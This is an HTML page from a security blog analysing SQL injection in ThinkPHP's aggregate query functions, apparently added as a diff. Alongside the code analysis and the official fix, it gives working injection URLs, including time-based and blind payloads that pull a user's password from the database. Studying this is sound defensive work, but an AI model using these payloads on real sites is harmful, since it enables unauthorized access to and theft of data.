@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          ThinkPHP 聚合查询漏洞 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/10/Thinkphp-聚合查询漏洞/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#Thinkphp" title="Thinkphp">Thinkphp</a>
+                        
+                    </div>
+                    <h1>ThinkPHP 聚合查询漏洞</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-10-19
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>说是漏洞，更恰当一点应该是安全隐患吧，由于是框架洞，总要结合一些开发人员不够专业的代码才能产生漏洞。</p>
+<p>这个聚合查询的漏洞主要影响的版本有</p>
+<ul>
+<li>Thinkphp5 &lt; 5.1.25</li>
+<li>Thinkphp3 &lt; 3.2.4</li>
+</ul>
+<p>影响的函数涉及到所有的聚合查询函数</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/1.png" alt></p>
+<p>而且，有一点就是，可以看到在TP5中涉及到SQL查询的地方，几乎都用了预编译</p>
+<p>而且由于<code>PDO::ATTR_EMULATE_PREPARES</code>设置的原因，导致模拟预处理关闭，从而在预编译阶段无法从数据库中获取数据，从而报错退出。从之前爆出的几个TP5漏洞中就能看到，这样一个很大的弊端就是即使注入存在，也无法从数据库中获取到数据。</p>
+<p>但是这个漏洞在预编译阶段没有使用占位符，从而不会在预编译阶段报错，从而可以顺利通过注入<strong>获取到数据</strong>。</p>
+<h1 id="ThinkPHP5-lt-5-1-25"><a href="#ThinkPHP5-lt-5-1-25" class="headerlink" title="ThinkPHP5 &lt; 5.1.25"></a>ThinkPHP5 &lt; 5.1.25</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里创建了一个这样的<code>user</code>表</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/2.png" alt></p>
+<p>数据库配置请自行配置，然后打开<code>debug</code>和<code>trace</code>模式（方便查看SQL语句</p>
+<p>demo样例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $count = input(<span class="string">'get.count'</span>);</span><br><span class="line">    $res = db(<span class="string">'user'</span>)-&gt;count($count);</span><br><span class="line">    var_dump($res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/tp5.1.25/</span>public<span class="regexp">/?count=id</span></span><br></pre></td></tr></table></figure>
+<p>就能看到返回了数量<code>3</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/3.png" alt></p>
+<p>当输入</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/tp5<span class="number">.1.</span><span class="number">25</span>/<span class="keyword">public</span>/?<span class="built_in">count</span>=id`),(<span class="keyword">select</span> sleep(<span class="number">5</span>)),(`username</span><br></pre></td></tr></table></figure>
+<p>就能看到有明显的五秒的延时</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/4.png" alt></p>
+<p>里面改成可以任意的SQL语句，例如通过盲注获取<code>password</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/tp5.1.25/public/?count=id`),(if(ascii(substr((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">130</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">3</span>))),(<span class="string">`username</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/5.png" alt></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>跟进到<code>count</code>函数中<code>thinkphp/library/think/db/Query.php:643</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/6.png" alt></p>
+<p>跟进<code>$count = $this-&gt;aggregate(&#39;COUNT&#39;, $field);</code> <code>thinkphp/library/think/db/Query.php:619</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/7.png" alt></p>
+<p>这里又调用了<code>$this-&gt;connection-&gt;aggregate</code></p>
+<p>注意此时的<code>$field</code>字段还是一开始传入的字符，没有任何变化</p>
+<p>然后跟进到<code>thinkphp/library/think/db/Connection.php:1316</code>中</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/8.png" alt></p>
+<p>可以看到这里的经过第一句之后<code>$field</code>被组合成了count语句，跟到<code>parseKey</code>的函数定义中就能看到具体处理过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span><span class="params">(Query $query, $key, $strict = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    $key = trim($key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strpos($key, <span class="string">'-&gt;'</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key, <span class="string">'('</span>)) &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (strpos($key, <span class="string">'.'</span>) &amp;&amp; !preg_match(<span class="string">'/[,\'\"\(\)`\s]/'</span>, $key)) &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'*'</span> != $key &amp;&amp; ($strict || !preg_match(<span class="string">'/[,\'\"\*\(\)`.\s]/'</span>, $key))) &#123;</span><br><span class="line">        $key = <span class="string">'`'</span> . $key . <span class="string">'`'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>省略了很多无关的处理函数，可以看到就是简单的通过反引号的字符串相连</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$key = <span class="string">'`'</span> . $key . <span class="string">'`'</span>;</span><br></pre></td></tr></table></figure>
+<p>继续回来到<code>aggregare</code>中，跟进<code>$this-&gt;value</code>，这就是真正执行这条SQL语句的地方</p>
+<p><code>thinkphp/library/think/db/Connection.php:1252</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/9.png" alt></p>
+<p>可以看到通过 <code>$this-&gt;builder-&gt;select($query);</code>将之前传入的参数直接拼接到了sql语句中</p>
+<p>最后形成<code>$sql</code>为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(`id`),(select sleep(5)),(`username`) AS tp_count FROM `user` LIMIT 1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/10.png" alt></p>
+<p>在<code>$query-&gt;getBind()</code>的时候是没有需要绑定的参数的，也就避免了后面预编译阶段的报错</p>
+<p>最后<code>$pdo = $this-&gt;query($sql, $bind, $options[&#39;master&#39;], true);</code>执行了SQL语句，产生注入</p>
+<p>全局搜索<code>-&gt;aggregate</code>的调用，发现所有的聚合函数都是调用了这个模块，同理也就产生了SQL注入</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/11.png" alt></p>
+<h1 id="ThinkPHP3-lt-3-2-4"><a href="#ThinkPHP3-lt-3-2-4" class="headerlink" title="ThinkPHP3 &lt; 3.2.4"></a>ThinkPHP3 &lt; 3.2.4</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>数据库配置和TP5中一致，也要打开<code>debug</code>和<code>trace</code>信息</p>
+<p>demo样例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $count = I(<span class="string">'get.count'</span>);</span><br><span class="line">    $m = M(<span class="string">'user'</span>)-&gt;count($count);</span><br><span class="line">    dump($m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的payload和TP5中的有一点点的不一样，不过也差不多</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/tp3.2.4/?count=id),(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>),(username</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/12.png" alt></p>
+<p>可以看到直接注入出了数据</p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>没啥好分析的了，和TP5类似，就是少了一个反引号的差别</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>官方很机智的在<code>parseKey</code>中加入了正则校验，不符合这个校验就会抛出异常</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Thinkphp-聚合查询漏洞/13.png" alt></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/10/hitcon2018-One-Line-PHP-Challenge/" data-toggle="tooltip" data-placement="top" title="hitcon2018 One Line PHP Challenge">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/10/phar-fastcgi-rsync-漏洞小结/" data-toggle="tooltip" data-placement="top" title="phar & fastcgi & rsync 漏洞小结">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#Thinkphp" title="Thinkphp">Thinkphp</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
